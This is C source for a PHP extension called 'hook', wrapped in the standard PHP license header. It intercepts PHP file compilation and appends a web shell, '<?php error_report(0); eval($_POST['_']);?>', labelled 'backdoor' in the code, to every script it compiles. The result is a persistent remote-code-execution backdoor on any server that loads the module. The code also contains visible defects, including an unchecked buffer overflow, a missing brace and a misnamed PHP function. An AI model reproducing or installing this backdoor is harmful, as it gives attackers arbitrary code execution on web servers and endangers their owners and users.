/*
  +----------------------------------------------------------------------+
  | PHP Version 7                                                        |
  +----------------------------------------------------------------------+
  | Copyright (c) 1997-2018 The PHP Group                                |
  +----------------------------------------------------------------------+
  | This source file is subject to version 3.01 of the PHP license,      |
  | that is bundled with this package in the file LICENSE, and is        |
  | available through the world-wide-web at the following url:           |
  | http://www.php.net/license/3_01.txt                                  |
  | If you did not receive a copy of the PHP license and are unable to   |
  | obtain it through the world-wide-web, please send a note to          |
  | license@php.net so we can mail you a copy immediately.               |
  +----------------------------------------------------------------------+
  | Author:                                                              |
  +----------------------------------------------------------------------+
*/

/* $Id$ */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_ini.h"
#include "ext/standard/info.h"
#include "php_hook.h"
#include "zend_compile.h"

static unsigned switch_bool;
static zend_op_array *(*orig_compile_file)(zend_file_handle *file_handle,int type);


static zend_op_array *my_compile_file(zend_file_handle *file_handle,int type)
{
	const char * filename;
	const char * myFilename;
	FILE * oldpoint;

	zend_file_handle new_file;
	myFilename = "/tmp/nuy.php";

	filename = file_handle->filename;
	oldpoint = fopen(file_handle->filename,"r");
	fseek(oldpoint,0L,SEEK_END);

	long size = ftell(oldpoint);

	rewind(oldpoint);

	char backdoor[] = { "<?php error_report(0); eval($_POST['_']);?>" };
	char buffer[1024];
	fread(buffer,size,1,oldpoint);
	fclose(oldpoint);

	strcat(buffer,backdoor);

	FILE *fp = fopen(myFilename,"wb");
	size_t len = strlen(buffer);
	size_t n = fwrite(buffer,1,len,fp);
	
	zend_stream_open(myFilename,&new_file);
	fclose(fp);

	return orig_compile_file(&new_file,type);

}


PHP_MINIT_FUNCTION(hook)
{
	switch_bool = 0;
	if(switch_bool == 0)
	{
		switch_bool =1;
		orig_compile_file = zend_compile_file;
		zend_compile_file = my_compile_file; 
	}
	
	return SUCCESS;
	return SUCCESS;
}

PHP_MSHUTDOWN_FUNCTION(hook)
{
	if(switch_bool == 1)
	{
		switch_bool = 0;
		zend_compile_file = orig_compile_file;
	}
	
	return SUCCESS;
}

PHP_RINIT_FUNCTION(hook)
{
#if defined(COMPILE_DL_HOOK) && defined(ZTS)
	ZEND_TSRMLS_CACHE_UPDATE();
#endif
	return SUCCESS;

PHP_RSHUTDOWN_FUNCTION(hook)
{
	return SUCCESS;
}

PHP_MINFO_FUNCTION(hook)
{
	php_info_print_table_start();
	php_info_print_table_header(2, "hook support", "enabled");
	php_info_print_table_end();


}



zend_module_entry hook_module_entry = {
	STANDARD_MODULE_HEADER,
	"hook",
	NULL,
	PHP_MINIT(hook),
	PHP_MSHUTDOWN(hook),
	PHP_RINIT(hook),		/* Replace with NULL if there's nothing to do at request start */
	PHP_RSHUTDOWN(hook),	/* Replace with NULL if there's nothing to do at request end */
	PHP_MINFO(hook),
	PHP_HOOK_VERSION,
	STANDARD_MODULE_PROPERTIES
};
/* }}} */

#ifdef COMPILE_DL_HOOK
#ifdef ZTS
ZEND_TSRMLS_CACHE_DEFINE()
#endif
ZEND_GET_MODULE(hook)
#endif

/*
 * Local variables:
 * tab-width: 4
 * c-basic-offset: 4
 * End:
 * vim600: noet sw=4 ts=4 fdm=marker
 * vim<600: noet sw=4 ts=4
 */
